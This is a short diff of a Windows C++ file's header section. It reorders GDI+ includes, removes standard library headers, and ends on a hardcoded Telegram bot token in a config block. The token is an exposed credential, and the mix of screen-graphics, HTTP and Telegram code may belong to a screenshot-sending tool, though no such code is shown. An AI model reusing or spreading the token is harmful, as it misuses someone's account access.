@@ -1,23 +1,16 @@
 #define WIN32_LEAN_AND_MEAN
 #define STRICT
+
 #include <windows.h>
+#include <objidl.h>     // ✅ REQUIRED before GDI+
+#include <gdiplus.h>
+
 #include <winhttp.h>
 #include <commctrl.h>
 #include <shellapi.h>
 
-// GDI+ WITHOUT problematic headers
-#include <gdiplus.h>
 #pragma comment(lib, "gdiplus.lib")
 
-#include <string>
-#include <vector>
-#include <fstream>
-#include <thread>
-#include <mutex>
-#include <chrono>
-
-using namespace Gdiplus;
-using namespace std;
 
 // Config
 const wchar_t* TELEGRAM_BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
